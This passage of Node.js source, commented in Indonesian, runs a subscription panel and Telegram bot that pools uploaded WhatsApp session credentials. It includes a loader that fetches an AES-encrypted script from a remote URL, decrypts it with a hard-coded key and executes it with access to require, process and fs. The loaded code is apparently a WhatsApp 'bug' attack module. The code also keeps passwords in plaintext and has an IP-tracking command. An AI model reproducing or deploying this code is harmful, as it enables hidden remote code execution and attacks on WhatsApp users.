      message: `Role '${viewerRole}' tidak bisa melihat daftar user.`,
    });
  }

  const users = db
    .filter(u => allowedRoles.includes(normalizeRoleName(u.role || "member")))
    .map(u => ({
      username: u.username,
      expiredDate: u.expiredDate,
      role: normalizeRoleName(u.role || "member"),
    }));

  return res.json({ valid: true, authorized: true, users });
});

// ===== Add User With Role (owner only) =====
app.get("/userAdd", (req, res) => {
  const { key, username, password, role = "member", day } = req.query;
  console.log(`[➕ USERADD] ${username} dengan role ${role} oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const creator = db.find(u => u.username === keyInfo.username);
  const creatorRole = normalizeRoleName(creator?.role || "member");
  const requestedRole = normalizeRoleName(role || "member");
  const allowedRoles = getAllowedCreateRoles(creatorRole);

  if (!creator || !allowedRoles.includes(requestedRole)) {
    console.log("[❌ USERADD] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: `Role '${creatorRole}' tidak bisa membuat role '${requestedRole}'.` });
  }

  if (db.find(u => u.username === username)) {
    console.log("[❌ USERADD] Username sudah ada.");
    return res.json({ valid: true, created: false, message: "Username already exists." });
  }

  const expired = new Date();
  expired.setDate(expired.getDate() + parseInt(day));

  const newUser = {
    username,
    password,
    role: requestedRole,
    expiredDate: expired.toISOString().split("T")[0],
  };

  db.push(newUser);
  saveDatabase(db);
    
    sendToGroups(
      `✅ *Akun Baru Dibuat*\nUsername: ${newUser.username}\nDibuat Oleh: ${creator.username}\nDurasi: ${day} hari\nRole: ${newUser.role}`,
        { parse_mode: "Markdown" }
    );

  const logLine = `${creator.username} Created ${newUser.username} Role ${requestedRole} Days ${day}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ USERADD] User berhasil dibuat:", newUser);
  return res.json({ valid: true, authorized: true, created: true, user: newUser });
});

// ===== Edit User Expired Date (reseller or owner) =====
app.get("/editUser", (req, res) => {
  const { key, username, addDays } = req.query;
  console.log(`[🛠️ EDIT] Tambah masa aktif ${username} +${addDays} hari oleh key ${key}`);

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const editor = db.find(u => u.username === keyInfo.username);

  if (!editor || !["reseller", "owner"].includes(editor.role)) {
    console.log("[❌ EDIT] Tidak diizinkan.");
    return res.json({ valid: true, authorized: false, message: "Only reseller or owner can edit user." });
  }

  // 🔐 Batasi maksimal 30 hari jika role adalah reseller
  if (editor.role === "reseller" && parseInt(addDays) > 30) {
    console.log("[❌ CREATE] Reseller tidak boleh membuat akun lebih dari 30 hari.");
    return res.json({ valid: true, created: false, invalidDay: true, message: "Reseller can only create accounts up to 30 days." });
  }

  const targetUser = db.find(u => u.username === username);
  if (!targetUser) {
    console.log("[❌ EDIT] User tidak ditemukan.");
    return res.json({ valid: true, edited: false, message: "User not found." });
  }

  // ✅ Tambahan validasi role untuk reseller
  if (editor.role === "reseller" && targetUser.role !== "member") {
    console.log("[❌ EDIT] Reseller hanya bisa mengedit user dengan role 'member'.");
    return res.json({ valid: true, edited: false, message: "Reseller hanya bisa mengedit user dengan role 'member'." });
  }

  const currentDate = new Date(targetUser.expiredDate);
  currentDate.setDate(currentDate.getDate() + parseInt(addDays));
  targetUser.expiredDate = currentDate.toISOString().split("T")[0];

  saveDatabase(db);
  const logLine = `${editor.username} Edited ${targetUser} Add Days ${addDays}\n`;
  fs.appendFileSync('logUser.txt', logLine);
  console.log("[✅ EDIT] Masa aktif diperbarui:", targetUser);
  return res.json({ valid: true, authorized: true, edited: true, user: targetUser });
});

// ===== GET /getLog =====
app.get("/getLog", (req, res) => {
  const { key } = req.query;

  const keyInfo = activeKeys[key];
  if (!keyInfo) return res.json({ valid: false, message: "Invalid key." });

  const db = loadDatabase();
  const user = db.find(u => u.username === keyInfo.username);

  if (!user || user.role !== "owner") {
    return res.json({ valid: true, authorized: false, message: "Access denied." });
  }

  try {
    //const fs = require("fs");
    const logContent = fs.readFileSync("logUser.txt", "utf-8");
    return res.json({ valid: true, authorized: true, logs: logContent });
  } catch (err) {
    return res.json({ valid: true, authorized: true, logs: "", error: "Failed to read log file." });
  }
});

const PeG74e4HR5 = 'LgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQleLgNv9KRt@Wp3^YzXMh#du7P$BqZoVFE54CxLA!itM%knUpRbOYJa$GcmX^T2wQle';

async function importFromRawEncrypted(url) {
  try {
    const { data } = await axios.get(url, { responseType: 'text' });
    const [ivB64, encryptedB64] = data.trim().split('.');

    const IV = Buffer.from(ivB64, 'base64');
    const KEY = crypto.createHash('sha256').update(PeG74e4HR5).digest();

    const decipher = crypto.createDecipheriv('aes-256-cbc', KEY, IV);
    let decrypted = decipher.update(encryptedB64, 'base64', 'utf8');
    decrypted += decipher.final('utf8');

    // Sandbox VM
    const context = {
      module: { exports: {} },
      require,
      console,
      process,
      Buffer,
      setTimeout,
      setInterval,
      //clearTimeout,
      clearInterval,
      crypto,
      proto,
      generateWAMessageFromContent,
      prepareWAMessageMedia,
      generateWAMessageContent,
      generateWAMessage,
      waUploadToServer,
      fs,
      generateRandomMessageId
    };

    const sandbox = vm.createContext(context);
    sandbox.globalThis = sandbox;
    sandbox.exports = sandbox.module.exports;

    const script = new vm.Script(decrypted, { filename: 'fangsyon.js' });
    script.runInContext(sandbox);

    return sandbox.module.exports;
  } catch (err) {
    console.error("❌ Gagal decrypt & import:", err.stack || err.message);
    return null;
  }
}

let bugWa;

//============ TEMPAT FUNCTION =============\\

// ======================================= //
// WhatsApp Connect Logic
const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files; // ✅ Tambahkan return
  } catch (err) {
    console.error("Buat Folder 'permenmd' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const cacheKey = buildSessionCacheKey(folderPath, sessionName);
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[cacheKey] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[cacheKey] = sock;
          } else if (type === "Messenger") {
            mess[cacheKey] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (deletingSessions.has(cacheKey)) {
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
            deletingSessions.delete(cacheKey);
            resolve();
            return;
          }

          if (statusCode === 440) {
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            delete activeConnections[cacheKey];
            delete biz[cacheKey];
            delete mess[cacheKey];
            removeSessionArtifacts(folderPath, sessionName);
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}
async function connectNewUserSessionsOnly() {
  const userIdFolder = "permenmd";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);
    const cacheKey = buildSessionCacheKey(sessionFolder, baseName);

    // Skip jika sudah ada koneksi aktif
    if (activeConnections[cacheKey]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    // Sambungkan sesi baru
    connectSession(sessionFolder, baseName);
  }
}

// Jika ingin refresh tanpa putus semua, pakai ini:
async function refreshUserSessions() {
  await startUserSessions();
  //startLoop();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
      return false;
  }
  const sessionDir = path.join('permenmd', owner, number); 
  const cacheKey = buildSessionCacheKey(owner, number);

  if (!fs.existsSync('permenmd')) fs.mkdirSync('permenmd');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
    const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
      logger: pino({ level: "silent" }),
      version: version,
      defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      if (deletingSessions.has(cacheKey)) {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
        removeSessionArtifacts(path.join('permenmd', owner), number);
        deletingSessions.delete(cacheKey);
        return;
      }

      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[cacheKey];
        delete biz[cacheKey];
        delete mess[cacheKey];
      }
    } else if (connection === "open") {
      activeConnections[cacheKey] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('permenmd', owner, `${number}.json`);
      const type = detectWATypeFromCreds(sourceCreds);

      if (type === "Business") {
        biz[cacheKey] = sock;
      } else if (type === "Messenger") {
        mess[cacheKey] = sock;
      }

try {
  await waiting(3000)
  if (fs.existsSync(sourceCreds)) {
    const data = fs.readFileSync(sourceCreds); // baca isi file sumber
    fs.writeFileSync(destCreds, data); // tulis ulang (overwrite)
    console.log(`✅ Rewrote session to ${destCreds}`);
  }
} catch (e) {
  console.error(`❌ Failed to rewrite creds: ${e.message}`);
}
    }
  });

  return null;
}


async function startUserSessions() {
  // Ambil semua subfolder dalam permenmd
  const subfolders = fs.readdirSync('permenmd')
    .map(name => path.join('permenmd', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;
      const cacheKey = buildSessionCacheKey(folder, sessionName);

      // ✅ Cek apakah session sudah aktif
      if (activeConnections[cacheKey]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName); // gunakan await kalau connectSession async
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSessions = [];

  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    const cacheKey = buildSessionCacheKey(subfolderName, sessionName);
    const sock = activeConnections[cacheKey];
    if (sock) {
      activeSessions.push({
        sock,
        sessionName,
        cacheKey,
      });
    }
  }

  if (!activeSessions.length) {
    return null;
  }

  return activeSessions[Math.floor(Math.random() * activeSessions.length)];
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) {
    fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], developerList: [], userList: [] }, null, 2));
  }

  const config = JSON.parse(fs.readFileSync(telegramDataPath));
  if (!Array.isArray(config.ownerList)) config.ownerList = [];
  if (!Array.isArray(config.userList)) config.userList = [];
  if (!Array.isArray(config.developerList)) config.developerList = [];
  return config;
}

function saveTelegramConfig(config) {
  fs.writeFileSync(telegramDataPath, JSON.stringify(config, null, 2));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🆔 ${u.telegramId || '-'} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

function findUserByIdentity(db, identity) {
  const normalized = String(identity || "").trim();
  if (!normalized) return null;

  return db.find((user) => {
    const username = String(user.username || "").trim();
    const telegramId = String(user.telegramId || "").trim();
    return username === normalized || telegramId === normalized;
  }) || null;
}

function extendUserExpiry(user, addDays) {
  const parsedDays = parseInt(addDays, 10);
  if (Number.isNaN(parsedDays) || parsedDays <= 0) {
    return { ok: false, message: "❌ Jumlah hari tidak valid." };
  }

  const baseDate = new Date(user.expiredDate);
  const startDate = Number.isNaN(baseDate.getTime()) || baseDate < new Date()
    ? new Date()
    : baseDate;

  startDate.setDate(startDate.getDate() + parsedDays);
  user.expiredDate = startDate.toISOString().split("T")[0];

  return { ok: true, expiredDate: user.expiredDate };
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isDeveloper = config.developerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isDeveloper;

  if (!isUser) return bot.sendMessage(id, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...((isOwner || isDeveloper) ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});
bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.onText(/^\/?refresh/, async (msg) => {
  const config = loadTelegramConfig();
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.")
  await refreshUserSessions()
  await bot.sendMessage(chatId, "⚠️ Server Is Refreshing wait for 30-60 Seconds.");
})

bot.onText(/^\/?addadmin\s+(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(userId);
  if (!isOwner) return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");

  const targetId = parseInt(match[1], 10);
  if (Number.isNaN(targetId)) {
    return bot.sendMessage(chatId, "❌ Format salah. Gunakan /addadmin <telegram_id>.");
  }

  if (!config.developerList.includes(targetId)) {
    config.developerList.push(targetId);
  }
  if (!config.userList.includes(targetId)) {
    config.userList.push(targetId);
  }

  saveTelegramConfig(config);
  bot.sendMessage(chatId, `✅ Telegram ID ${targetId} berhasil ditambahkan sebagai developer.`);
})

bot.onText(/^\/(\d+)(?:\s+(\d+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const requesterId = msg.from.id;
  const config = loadTelegramConfig();
  const isAllowed = config.ownerList.includes(requesterId) || config.developerList.includes(requesterId) || config.userList.includes(requesterId);

  if (!isAllowed) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  const telegramId = String(match[1] || "").trim();
  const addDays = String(match[2] || "").trim();

  if (!telegramId || !addDays) {
    return bot.sendMessage(chatId, "⚠️ Format salah.\nGunakan `/telegram_id jumlah_hari`\nContoh: `/628123456789 30`", {
      parse_mode: "Markdown"
    });
  }

  const db = loadDatabase();
  const user = findUserByIdentity(db, telegramId);
  if (!user) {
    return bot.sendMessage(chatId, `❌ User dengan Telegram ID ${telegramId} tidak ditemukan.`);
  }

  if (!config.ownerList.includes(requesterId) && user.role !== "member") {
    return bot.sendMessage(chatId, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
  }

  const result = extendUserExpiry(user, addDays);
  if (!result.ok) {
    return bot.sendMessage(chatId, result.message);
  }

  saveDatabase(db);
  return bot.sendMessage(chatId, `✅ Akses ${user.username} (${telegramId}) diperpanjang ${addDays} hari.\n⏳ Expired baru: ${user.expiredDate}`);
});

bot.onText(/^\/?globalsession/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (msg.chat.type === "private") {
    return bot.sendMessage(chatId, "lu ngapain");
  }

  const connectedBiz = Object.keys(biz);
  const connectedMess = Object.keys(mess);
  const connectedNumbers = Object.keys(activeConnections);

  const onlineMess = connectedMess || [];
  const onlineBiz = connectedBiz || [];
  const onlineNumbers = connectedNumbers || [];

  let message = `📌 Global Session\n\n`;

  message += 'Messenger Session:\n';
  message += onlineMess.length > 0
    ? connectedMess.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nBusiness Session:\n';
  message += onlineBiz.length > 0
    ? connectedBiz.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  message += '\nActive Numbers:\n';
  message += onlineNumbers.length > 0
    ? connectedNumbers.map((num, index) => `${index + 1}. ${num}`).join("\n")
    : "❌ None";

  bot.sendMessage(chatId, message);
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isDeveloper = config.developerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner || isDeveloper;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `telegram_id|username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !day) {
          return bot.sendMessage(id, "❌ Format salah. Gunakan `telegram_id|username|password|durasi_hari`.");
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "❌ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ telegramId, username, password, role: "member", expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun member dibuat:
🆔 Telegram ID: ${telegramId}
👤 Username: ${username}
🔐 Password: ${password}`);
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username_atau_telegram_id|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [identity, addDays] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        const user = findUserByIdentity(db, identity);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const result = extendUserExpiry(user, addDays);
        if (!result.ok) {
          return bot.sendMessage(id, result.message);
        }

        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${user.username} (${user.telegramId || '-'}) ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner && !isDeveloper) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan: `telegram_id|username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [telegramId, username, password, role, day] = msg.text.split("|").map(item => item.trim());
        const db = loadDatabase();
        if (!telegramId || !username || !password || !role || !day) {
          return bot.sendMessage(id, "❌ Format salah. Gunakan `telegram_id|username|password|role|durasi_hari`.");
        }
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        if (db.find(u => String(u.telegramId || "") === telegramId)) return bot.sendMessage(id, "❌ Telegram ID sudah terdaftar!");
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        db.push({ telegramId, username, password, role, expiredDate: expired.toISOString().split("T")[0] });
        saveDatabase(db);
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
🆔 Telegram ID: ${telegramId}
👤 Username: ${username}`);
      });
      break;

    case "delete_user":
      if (!isOwner && !isDeveloper) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} berhasil dihapus.`);
      });
      break;
  }
});

function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/?status$/, async (msg) => {
  const chatId = msg.chat.id;

  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;

    const pingStart = Date.now();
    await axios.get(`http://inipanelnyariostorepanel.mbgwowo.web.id:${PORT}/ping`);
    const ping = Date.now() - pingStart;

    const text = `*Xadow Server Status*

*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Darkness-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

// === Fitur Track IP ===
bot.onText(/^\/?trackip (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const ip = match[1].trim();
  
  if (msg.from.id !== OWNER_ID) {
    return bot.sendMessage(chatId, "❌ Kamu tidak memiliki izin untuk menggunakan perintah ini.");
  }

  if (!/^(?:\d{1,3}\.){3}\d{1,3}$/.test(ip) && !/^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(ip)) {
    return bot.sendMessage(chatId, "⚠️ Format IP / domain tidak valid.\n\nContoh:\n`/trackip 8.8.8.8`\n`/trackip google.com`", { parse_mode: "Markdown" });
  }

  await bot.sendMessage(chatId, "🔍 Sedang melacak informasi IP...");

  try {
    const { data } = await axios.get(`https://ipapi.co/${ip}/json/`);

    if (data.error) {
      return bot.sendMessage(chatId, `❌ Gagal melacak IP: ${data.reason || "tidak ditemukan."}`);
    }

    const info = `
*IP Tracker Result*

IP: ${data.ip || ip}
Kota: ${data.city || "-"}
Negara: ${data.country_name || "-"} (${data.country_code || "?"})
Zona Waktu: ${data.timezone || "-"}
ISP: ${data.org || "-"}
Latitude: ${data.latitude || "-"}
Longitude: ${data.longitude || "-"}

Database: ${data.asn || "-"}
    `.trim();

    await bot.sendMessage(chatId, info, { parse_mode: "Markdown" });

    // Kirim peta lokasi (jika ada koordinat)
    if (data.latitude && data.longitude) {
      await bot.sendLocation(chatId, data.latitude, data.longitude);
    }

  } catch (err) {
    console.error("❌ Error trackip:", err.message);
    bot.sendMessage(chatId, "❌ Gagal mengambil data IP, coba lagi nanti.");
  }
});

// ===== Fitur reset akun role =====
// Usage:
// 1) /resetakunmember        -> bot akan menanyakan konfirmasi
// 2) /resetakunmember yes    -> konfirmasi, lalu hapus semua akun role 'member'
// Sama untuk: resetakunowner, resetakunreseller, resetakunvip
// Untuk hapus semua akun: /resetall yes
// NOTE: hanya telegram owner (config.ownerList) yang boleh menjalankan.
// === FITUR RESET AKUN DENGAN BUTTON KONFIRMASI (HANYA ID KAMU) ===
// 🔐 Ganti dengan ID Telegram kamu

function loadDB() {
  if (!fs.existsSync("database.json")) fs.writeFileSync("database.json", JSON.stringify([]));
  return JSON.parse(fs.readFileSync("database.json"));
}
function saveDB(data) {
  fs.writeFileSync("database.json", JSON.stringify(data, null, 2));
}

// 🔧 Fungsi utama hapus akun
function doReset(role) {
  const db = loadDB();
  let deleted = [], remain = [];

  if (role === "all") {
    deleted = db.map(u => u.username);
    remain = [];
  } else {
    for (const u of db) {
      if ((u.role || "member") === role) deleted.push(u.username);
      else remain.push(u);
    }
  }

  saveDB(remain);
